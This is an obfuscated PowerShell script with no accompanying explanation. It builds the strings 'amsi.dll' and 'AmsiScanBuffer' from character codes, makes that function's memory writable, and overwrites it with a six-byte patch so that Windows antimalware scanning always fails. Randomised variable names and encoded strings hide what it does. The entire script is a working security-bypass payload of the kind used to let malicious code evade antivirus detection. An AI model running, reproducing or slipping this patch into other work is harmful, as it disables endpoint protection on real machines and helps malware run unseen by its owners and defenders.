$VuMTmZUox7qZb = @"
using System;
using System.Runtime.InteropServices;
public class VuMTmZUox7qZb {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr _RJr48E3ZnIqfNNiZE, string XiL9x5MUj);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lAdkiIYSCoADe, UIntPtr CWUe, uint OqURBwou, out uint JmXrNq2Z_jMZj4);
}
"@

Add-Type $VuMTmZUox7qZb

$KZ_7iN_a41ZvkUshI = [VuMTmZUox7qZb]::LoadLibrary("$([ChaR](97+21-21)+[chAR]([bYtE]0x6d)+[CHAr]([bYte]0x73)+[cHAr](79+26)+[chaR]([bYTe]0x2e)+[CHAR](100*69/69)+[ChAr](108+12-12)+[cHaR]([byte]0x6c))")
$mOk3x98cl_fWXd26 = [VuMTmZUox7qZb]::GetProcAddress($KZ_7iN_a41ZvkUshI, "$([chAr]([ByTe]0x41)+[CHAr]([bYte]0x6d)+[ChAR](115)+[CHaR](105)+[CHAr]([BytE]0x53)+[cHaR]([BYTe]0x63)+[cHar]([bYTe]0x61)+[CHar](110+30-30)+[cHAr]([bYTe]0x42)+[CHAr](117)+[chAR](102+46-46)+[CHAR]([bYtE]0x66)+[CHAR]([bYTe]0x65)+[CHAr](64+50))")
$p = 0
[VuMTmZUox7qZb]::VirtualProtect($mOk3x98cl_fWXd26, [uint32]5, 0x40, [ref]$p)
$EmGA0YXHRXPPO9Cb31 = "0xB8"
$TxxzCsDM = "0x57"
$M85FAWtB8 = "0x00"
$GoIXKxgDlR4n = "0x07"
$EKc0df02bHq2lHLMf573 = "0x80"
$yHnc4ExWik5 = "0xC3"
$b2Le7FC = [Byte[]] ($EmGA0YXHRXPPO9Cb31,$TxxzCsDM,$M85FAWtB8,$GoIXKxgDlR4n,+$EKc0df02bHq2lHLMf573,+$yHnc4ExWik5)
[System.Runtime.InteropServices.Marshal]::Copy($b2Le7FC, 0, $mOk3x98cl_fWXd26, 6)